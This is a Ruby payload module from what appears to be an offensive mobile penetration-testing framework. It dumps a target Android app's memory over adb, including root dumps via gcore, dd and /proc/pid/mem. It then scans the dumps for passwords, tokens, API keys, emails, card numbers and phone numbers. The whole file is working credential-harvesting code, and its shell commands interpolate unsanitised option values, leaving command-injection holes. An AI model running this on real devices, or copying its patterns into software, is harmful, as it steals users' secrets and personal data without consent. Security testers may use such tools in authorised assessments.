require_relative '../../../core/payload_base'

module MPF
  module Payloads
    module Stages
      module Android
        class MemoryDump < MPF::Core::PayloadBase
          
          def register_info
            @info = {
              name: 'Android Memory Dump Payload',
              module: 'payload/android/stages/memory_dump',
              platform: :android,
              description: 'Dumps application memory to extract sensitive data like credentials, ' \
                          'encryption keys, and session tokens from runtime memory.',
              authors: ['MPF Research Team'],
              severity: 'critical'
            }
            @payload_type = :stage
          end

          def register_options
            add_option('TARGET_PACKAGE', 'Target application package name', required: true)
            add_option('DUMP_TYPE', 'Type: full, heap, native, strings', default: 'heap')
            add_option('SEARCH_PATTERN', 'Pattern to search in memory (regex)', required: false)
            add_option('DEVICE', 'Target device ID', default: 'emulator-5554')
            add_option('OUTPUT_DIR', 'Output directory for dumps', default: 'reports/payload/memory_dumps')
          end

          def generate(opts = {})
            dump_type = get_option('DUMP_TYPE')
            
            {
              type: 'memory_dump',
              dump_type: dump_type,
              description: "Dump #{dump_type} memory from target application"
            }
          end

          def execute(target_info)
            validation = validate
            unless validation[:valid]
              return { success: false, error: validation[:errors] }
            end

            package = get_option('TARGET_PACKAGE')
            dump_type = get_option('DUMP_TYPE')
            device = get_option('DEVICE')
            output_dir = get_option('OUTPUT_DIR')

            print_status("Starting memory dump...")
            print_status("Target: #{package}")
            print_status("Dump Type: #{dump_type}")

            # Create output directory
            `mkdir -p #{output_dir}` unless Dir.exist?(output_dir)

            # Get process ID
            pid = get_process_id(package, device)
            unless pid
              return {
                success: false,
                error: "Process not found. Ensure #{package} is running."
              }
            end

            print_good("Target PID: #{pid}")

            # Perform memory dump based on type
            result = case dump_type
            when 'full'
              dump_full_memory(pid, package, device, output_dir)
            when 'heap'
              dump_heap_memory(pid, package, device, output_dir)
            when 'native'
              dump_native_memory(pid, package, device, output_dir)
            when 'strings'
              dump_strings(pid, package, device, output_dir)
            else
              { success: false, error: "Unknown dump type: #{dump_type}" }
            end

            if result[:success]
              # Search for patterns if specified
              if get_option('SEARCH_PATTERN')
                search_result = search_memory_dump(result[:dump_file], get_option('SEARCH_PATTERN'))
                result[:search_results] = search_result
              end

              print_good("Memory dump complete!")
              result.merge({
                impact: 'Application memory dumped - may contain sensitive data'
              })
            else
              print_error("Memory dump failed")
              result
            end
          end

          private

          def get_process_id(package, device)
            cmd = "adb -s #{device} shell ps | grep #{package}"
            output = `#{cmd} 2>&1`

            if output =~ /\s+(\d+)\s+/
              $1
            else
              nil
            end
          end

          def dump_full_memory(pid, package, device, output_dir)
            print_status("Dumping full process memory...")
            
            timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
            dump_file = File.join(output_dir, "#{package}_full_#{timestamp}.dump")

            # Use gcore if available (requires root)
            cmd = "adb -s #{device} shell su -c 'gcore -o /data/local/tmp/dump #{pid}'"
            output = `#{cmd} 2>&1`

            if $?.success?
              # Pull dump file
              pull_cmd = "adb -s #{device} pull /data/local/tmp/dump.#{pid} #{dump_file}"
              `#{pull_cmd} 2>&1`

              if File.exist?(dump_file)
                print_good("Full memory dump saved: #{dump_file}")
                return {
                  success: true,
                  dump_file: dump_file,
                  dump_type: 'full',
                  size: File.size(dump_file)
                }
              end
            end

            # Fallback: dump /proc/pid/mem
            print_status("Trying /proc/#{pid}/mem method...")
            dump_proc_mem(pid, device, dump_file)
          end

          def dump_heap_memory(pid, package, device, output_dir)
            print_status("Dumping heap memory...")
            
            timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
            dump_file = File.join(output_dir, "#{package}_heap_#{timestamp}.hprof")

            # Use am dumpheap
            remote_path = "/data/local/tmp/heap_#{pid}.hprof"
            cmd = "adb -s #{device} shell am dumpheap #{package} #{remote_path}"
            output = `#{cmd} 2>&1`

            if $?.success?
              sleep(2) # Wait for dump to complete
              
              # Pull heap dump
              pull_cmd = "adb -s #{device} pull #{remote_path} #{dump_file}"
              pull_output = `#{pull_cmd} 2>&1`

              if File.exist?(dump_file)
                print_good("Heap dump saved: #{dump_file}")
                
                # Clean up remote file
                `adb -s #{device} shell rm #{remote_path} 2>&1`

                # Convert hprof if hprof-conv is available
                converted_file = convert_hprof(dump_file)

                return {
                  success: true,
                  dump_file: converted_file || dump_file,
                  dump_type: 'heap',
                  size: File.size(dump_file),
                  note: 'Use MAT (Memory Analyzer Tool) to analyze heap dump'
                }
              end
            end

            {
              success: false,
              error: 'Heap dump failed. App may need to be debuggable.'
            }
          end

          def dump_native_memory(pid, package, device, output_dir)
            print_status("Dumping native memory regions...")
            
            timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
            dump_file = File.join(output_dir, "#{package}_native_#{timestamp}.dump")

            # Read /proc/pid/maps to get memory regions
            maps_cmd = "adb -s #{device} shell cat /proc/#{pid}/maps"
            maps_output = `#{maps_cmd} 2>&1`

            if $?.success? && maps_output.length > 0
              # Save memory map
              map_file = dump_file.gsub('.dump', '_maps.txt')
              File.write(map_file, maps_output)
              print_good("Memory map saved: #{map_file}")

              # Dump native heap regions
              native_regions = maps_output.lines.select { |line| line.include?('[heap]') || line.include?('[anon:') }
              
              if native_regions.any?
                print_status("Found #{native_regions.length} native memory regions")
                
                # For each region, try to dump
                dumps = []
                native_regions.first(5).each_with_index do |region, idx|
                  if region =~ /^([0-9a-f]+)-([0-9a-f]+)/
                    start_addr = $1
                    end_addr = $2
                    
                    region_file = dump_file.gsub('.dump', "_region_#{idx}.bin")
                    dump_cmd = "adb -s #{device} shell su -c 'dd if=/proc/#{pid}/mem bs=1 skip=$((0x#{start_addr})) count=$((0x#{end_addr} - 0x#{start_addr})) of=/data/local/tmp/region_#{idx}.bin' 2>&1"
                    
                    if system(dump_cmd)
                      `adb -s #{device} pull /data/local/tmp/region_#{idx}.bin #{region_file} 2>&1`
                      dumps << region_file if File.exist?(region_file)
                    end
                  end
                end

                if dumps.any?
                  return {
                    success: true,
                    dump_file: map_file,
                    region_dumps: dumps,
                    dump_type: 'native',
                    size: dumps.sum { |f| File.size(f) }
                  }
                end
              end
            end

            {
              success: false,
              error: 'Native memory dump requires root access'
            }
          end

          def dump_strings(pid, package, device, output_dir)
            print_status("Extracting strings from memory...")
            
            timestamp = Time.now.strftime('%Y%m%d_%H%M%S')
            strings_file = File.join(output_dir, "#{package}_strings_#{timestamp}.txt")

            # First, try to dump heap
            heap_result = dump_heap_memory(pid, package, device, output_dir)
            
            if heap_result[:success]
              # Extract strings from heap dump
              print_status("Extracting strings from heap dump...")
              
              cmd = "strings #{heap_result[:dump_file]} > #{strings_file}"
              `#{cmd} 2>&1`

              if File.exist?(strings_file) && File.size(strings_file) > 0
                # Analyze strings for sensitive data
                analysis = analyze_strings(strings_file)
                
                print_good("Strings extracted: #{strings_file}")
                return {
                  success: true,
                  dump_file: strings_file,
                  heap_dump: heap_result[:dump_file],
                  dump_type: 'strings',
                  size: File.size(strings_file),
                  analysis: analysis
                }
              end
            end

            {
              success: false,
              error: 'String extraction failed'
            }
          end

          def dump_proc_mem(pid, device, dump_file)
            cmd = "adb -s #{device} shell su -c 'cat /proc/#{pid}/mem' > #{dump_file}"
            output = `#{cmd} 2>&1`

            if File.exist?(dump_file) && File.size(dump_file) > 0
              {
                success: true,
                dump_file: dump_file,
                dump_type: 'full',
                size: File.size(dump_file),
                note: 'Requires root access'
              }
            else
              {
                success: false,
                error: 'Memory dump requires root access'
              }
            end
          end

          def convert_hprof(hprof_file)
            # Check if hprof-conv is available
            if system("which hprof-conv > /dev/null 2>&1")
              converted_file = hprof_file.gsub('.hprof', '_converted.hprof')
              cmd = "hprof-conv #{hprof_file} #{converted_file}"
              
              if system(cmd)
                print_good("HPROF converted for MAT analysis")
                return converted_file
              end
            end
            nil
          end

          def analyze_strings(strings_file)
            print_status("Analyzing strings for sensitive data...")
            
            content = File.read(strings_file, mode: 'rb').force_encoding('UTF-8').encode('UTF-8', 'UTF-8', invalid: :replace, undef: :replace, replace: '')
            
            patterns = {
              passwords: /password|passwd|pwd/i,
              tokens: /token|bearer|jwt/i,
              api_keys: /api[_-]?key|apikey/i,
              emails: /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/,
              urls: /https?:\/\/[^\s]+/,
              credit_cards: /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/,
              phone_numbers: /\b\d{3}[-.]?\d{3}[-.]?\d{4}\b/
            }

            findings = {}
            patterns.each do |type, pattern|
              matches = content.scan(pattern).uniq
              findings[type] = matches.first(10) if matches.any?
            end

            # Save analysis
            analysis_file = strings_file.gsub('.txt', '_analysis.txt')
            File.open(analysis_file, 'w') do |f|
              f.puts "String Analysis Report"
              f.puts "=" * 60
              f.puts "Timestamp: #{Time.now}"
              f.puts "\n"

              findings.each do |type, matches|
                f.puts "#{type.to_s.capitalize}:"
                f.puts "-" * 60
                matches.each { |m| f.puts "  #{m}" }
                f.puts "\n"
              end
            end

            print_good("Analysis saved: #{analysis_file}")
            findings
          end

          def search_memory_dump(dump_file, pattern)
            print_status("Searching for pattern: #{pattern}")
            
            cmd = "strings #{dump_file} | grep -E '#{pattern}'"
            output = `#{cmd} 2>&1`

            matches = output.lines.map(&:strip).uniq
            
            if matches.any?
              print_good("Found #{matches.length} matches")
              matches.first(20)
            else
              print_warning("No matches found")
              []
            end
          end

          def print_status(msg)
            puts "[*] #{msg}"
          end

          def print_good(msg)
            puts "[+] #{msg}"
          end

          def print_warning(msg)
            puts "[!] #{msg}"
          end

          def print_error(msg)
            puts "[-] #{msg}"
          end
        end
      end
    end
  end
end
